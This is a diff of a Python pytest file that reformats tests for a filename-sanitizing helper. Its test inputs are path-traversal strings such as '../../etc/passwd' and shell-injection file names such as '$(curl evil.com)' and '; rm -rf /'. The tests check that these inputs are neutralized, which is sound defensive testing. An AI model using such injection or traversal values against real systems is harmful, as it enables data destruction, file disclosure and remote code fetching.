@@ -12,6 +12,7 @@ def _import_safety_helpers():
     logique pure, pas l'intégration UI.
     """
     import re
+
     _SAFE_FILENAME_RE = re.compile(r"[^A-Za-z0-9._-]+")
 
     def _safe_filename(raw: str, fallback: str = "upload") -> str:
@@ -33,32 +34,41 @@ class TestSafeFilename:
     def setup_method(self):
         self._safe_filename, _ = _import_safety_helpers()
 
-    @pytest.mark.parametrize("raw,expected", [
-        ("normal.xlsx", "normal.xlsx"),
-        ("Contenu_2026-05-18_VictorLenain.xlsx", "Contenu_2026-05-18_VictorLenain.xlsx"),
-        ("file with spaces.csv", "file_with_spaces.csv"),
-        ("file-with-dashes.txt", "file-with-dashes.txt"),
-        ("file.with.many.dots.xlsx", "file.with.many.dots.xlsx"),
-    ])
+    @pytest.mark.parametrize(
+        "raw,expected",
+        [
+            ("normal.xlsx", "normal.xlsx"),
+            ("Contenu_2026-05-18_VictorLenain.xlsx", "Contenu_2026-05-18_VictorLenain.xlsx"),
+            ("file with spaces.csv", "file_with_spaces.csv"),
+            ("file-with-dashes.txt", "file-with-dashes.txt"),
+            ("file.with.many.dots.xlsx", "file.with.many.dots.xlsx"),
+        ],
+    )
     def test_legitimate_names_preserved(self, raw, expected):
         assert self._safe_filename(raw) == expected
 
-    @pytest.mark.parametrize("raw,expected", [
-        ("../../etc/passwd", "etc_passwd"),
-        ("..", "upload"),
-        ("../", "upload"),
-        ("/etc/passwd", "etc_passwd"),
-        ("..\\..\\Windows\\System32", "Windows_System32"),
-    ])
+    @pytest.mark.parametrize(
+        "raw,expected",
+        [
+            ("../../etc/passwd", "etc_passwd"),
+            ("..", "upload"),
+            ("../", "upload"),
+            ("/etc/passwd", "etc_passwd"),
+            ("..\\..\\Windows\\System32", "Windows_System32"),
+        ],
+    )
     def test_path_traversal_neutralized(self, raw, expected):
         assert self._safe_filename(raw) == expected
 
-    @pytest.mark.parametrize("raw,expected", [
-        ("évil; rm -rf /.xlsx", "vil_rm_-rf_.xlsx"),
-        ("$(curl evil.com)", "curl_evil.com"),
-        ("file&name|pipe.txt", "file_name_pipe.txt"),
-        ("file\nname.txt", "file_name.txt"),
-    ])
+    @pytest.mark.parametrize(
+        "raw,expected",
+        [
+            ("évil; rm -rf /.xlsx", "vil_rm_-rf_.xlsx"),
+            ("$(curl evil.com)", "curl_evil.com"),
+            ("file&name|pipe.txt", "file_name_pipe.txt"),
+            ("file\nname.txt", "file_name.txt"),
+        ],
+    )
     def test_shell_metacharacters_stripped(self, raw, expected):
         assert self._safe_filename(raw) == expected
 
